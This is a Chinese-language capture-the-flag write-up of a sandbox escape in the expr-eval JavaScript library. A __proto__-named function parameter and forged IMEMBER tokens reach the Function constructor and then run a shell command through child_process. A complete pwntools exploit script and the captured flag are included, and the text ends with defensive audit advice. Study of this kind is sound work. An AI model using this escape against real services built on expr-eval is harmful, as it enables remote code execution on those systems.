# L3akCTF 2025 Math as a Service Writeup

## 题目简述

题目把输入交给 JavaScript 表达式解析库 `expr-eval`：

```javascript
const parser = new Parser({ allowMemberAccess: false });
const expr = parser.parse(line.trim());
const result = expr.evaluate();
```

容器并非使用 npm 上的旧版本，而是在构建时检出上游仓库的固定提交 `6e889e0e75c50ac37d70c35388602025650e0c50`，作者显然认为该提交已经修复原型链访问问题。实际上，普通成员访问虽然被关闭，表达式中的函数定义、`__proto__` 赋值和求值器内部指令对象仍能组合成沙箱逃逸。

决定性障碍是突破 JavaScript 表达式执行边界并取得任意代码执行，因此本文归入 pwn，而不是按仓库中的 `misc` 标签归档。漏洞所依赖的求值逻辑可在[题目固定的 expr-eval 提交](https://github.com/silentmatt/expr-eval/tree/6e889e0e75c50ac37d70c35388602025650e0c50)中核对。

## 解题过程

### 分析不完整的防护

该版本在处理普通变量指令 `IVAR` 时检查名称：

```javascript
if (/^__proto__|prototype|constructor$/.test(item.value)) {
  throw new Error('prototype access detected');
}
```

同时，`allowMemberAccess: false` 会阻止用户直接写出常规的 `.constructor` 访问。然而求值器内部仍支持如下指令：

```javascript
} else if (type === IMEMBER) {
  n1 = nstack.pop();
  nstack.push(n1[item.value]);
}
```

只要能伪造 `{type: "IMEMBER", value: "constructor"}` 一类的内部 token，就能绕过解析阶段和 `IVAR` 名称检查。

另一个关键点位于用户自定义函数的作用域构造过程。库会复制当前变量，然后按参数名写入实参：

```javascript
var scope = Object.assign({}, values);
scope[args[i]] = arguments[i];
```

若把形参命名为 `__proto__`，这次写入不是创建普通自有属性，而是改变 `scope` 的原型。随后，表达式中对 `caller`、`arguments` 等名字的解析可以沿着被污染的原型链取得函数对象的敏感属性。

### 取出求值器及其参数

官方解题脚本先在表达式语言内定义几个辅助函数：

```javascript
getCaller(__proto__)=caller;
getArgs(__proto__)=arguments;
getEvaluate(__proto__)=evaluate;
makeFakeInstr(__proto__,type,value)=arguments[2];
```

调用这些函数时，传入的函数对象被设置为局部作用域的原型。这样便能取得调用者 `evaluate`，再读取该次求值调用的参数：

```javascript
evaluate = getCaller(getCaller);
evaluateArgs = getArgs(evaluate);
expr = evaluateArgs[1];
values = evaluateArgs[2];
```

此时已经获得内部求值函数、当前表达式对象及变量表，不再受正常解析器所生成 token 的限制。

### 伪造成员访问指令

利用同一原型链技巧构造三个内部指令：

```javascript
fakeMember = makeFakeInstr(evaluate,"IMEMBER","constructor");
fakeIVAR = makeFakeInstr(evaluate,"IVAR","evaluate");
fakeInstrs = [fakeIVAR, fakeMember, fakeMember];
Function = evaluate(fakeInstrs,expr,values);
```

伪造的指令序列先取出 `evaluate`，再连续读取 `constructor`。因为这些 `IMEMBER` token 是直接交给内部求值器的，并未经过 `allowMemberAccess` 的语法检查，最终可取得 JavaScript 的 `Function` 构造器。

### 执行系统命令

取得 `Function` 后即可创建任意 JavaScript 函数，并通过 Node.js 的 `child_process` 读取随机文件名的 flag：

```javascript
exploit = Function(
  "console.log(" +
  "process.mainModule.require('child_process')" +
  ".execSync('cat flag_*').toString()" +
  ")"
);
exploit();
```

提交时需要删掉换行，使整个输入成为解析器接受的一行。完整 payload 如下：

```python
from pwn import remote

io = remote("challenge.example", 5000)

payload = """
getCaller(__proto__)=caller;
getArgs(__proto__)=arguments;
getEvaluate(__proto__)=evaluate;
makeFakeInstr(__proto__,type,value)=arguments[2];
evaluate=getCaller(getCaller);
evaluateArgs=getArgs(evaluate);
expr=evaluateArgs[1];
values=evaluateArgs[2];
fakeMember=makeFakeInstr(evaluate,"IMEMBER","constructor");
fakeIVAR=makeFakeInstr(evaluate,"IVAR","evaluate");
fakeInstrs=[fakeIVAR,fakeMember,fakeMember];
Function=evaluate(fakeInstrs,expr,values);
exploit=Function("console.log(process.mainModule.require('child_process').execSync('cat flag_*').toString())");
exploit();
""".replace("\n", "").strip()

io.sendlineafter(
    b"Enter your arithmetic expression (e.g., 1 + 2):\n",
    payload.encode(),
)
print(io.recvline().decode().strip())
io.close()
```

输出为：

```text
L3AK{57r1c7_m0d3_1n_pl4c3_k33p5_7h3_0_d4y5_47_b4y_f72eb7086c2957d4}
```

## 方法总结

本题说明“禁止成员访问”并不等于隔离 JavaScript 对象模型。解析器虽然拦住了用户直接写出的危险标识符，却仍让攻击者通过 `__proto__` 形参改变求值作用域，又暴露了可直接调用的内部求值函数。伪造 token 后，原本只存在于解析阶段的限制全部失效。

审计表达式沙箱时，应把语法解析、内部中间表示和运行时作用域作为同一个信任边界检查：危险名称过滤必须覆盖函数参数与属性访问；内部指令不能由表达式数据伪造；执行环境也不应暴露 `Function`、`process` 或模块加载入口。只修补其中一层，通常仍可被跨层组合绕过。
